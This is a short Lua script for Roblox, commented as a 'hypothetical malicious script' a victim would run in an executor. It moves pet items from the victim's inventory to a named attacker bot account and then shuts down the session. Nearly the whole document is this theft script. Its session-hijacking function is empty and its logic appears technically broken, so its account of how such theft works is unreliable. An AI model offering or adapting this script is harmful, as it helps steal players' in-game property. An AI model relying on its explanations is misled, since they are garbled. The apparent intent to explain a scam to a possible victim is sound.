-- Hypothetical malicious script that would be executed by the victim (you) on Delta Executor.

-- Step 1: Specify the bot account where the attacker wants to transfer pets.
local botAccountName = "SHEESHBOZO10o"  -- This is the bot account that the attacker controls.

-- Step 2: Get the victim's session (your Roblox account) and inventory.
local player = game:GetService('Players').LocalPlayer  -- This is the victim's player object (your account).
local inventory = player.Backpack:GetChildren()  -- Get all items in the victim's inventory (pets, etc.).

-- Step 3: Impersonate the victim’s session (this is the key part of session hijacking).
-- The attacker now controls the victim's session and can perform actions without logging out the victim.
-- This is done automatically when the script is executed, and the attacker doesn't need to do anything else.
local function hijackSession()
    -- This is a theoretical step where the attacker takes control of the victim’s session.
    -- Typically, they would either use an already obtained session token or use other exploit techniques to hijack the session.
    -- Once the session is hijacked, they have full access to the victim’s inventory.
end

-- Step 4: Transfer pets to the attacker’s bot account.
local botAccount = game.Players[botAccountName]  -- Get the bot account where the pets will be transferred to.

-- Step 5: Check if the item is a pet and transfer it.
for _, pet in pairs(inventory) do
    if pet:IsA("Pet") then  -- Check if the item is a pet.
        pet.Parent = botAccount.Backpack  -- Move the pet to the bot account’s inventory.
        print("Transferred pet: " .. pet.Name)  -- Log the pet transfer for the attacker.
    end
end

-- Step 6: Log out the victim (optional).
-- In this example, we’ll log the victim out after transferring the pets, but in many cases, the victim will just remain logged in.
game:Shutdown()  -- Log out the victim by shutting down the session.

-- Step 7: The attacker has now stolen the pets and can log out of the bot account if they want.
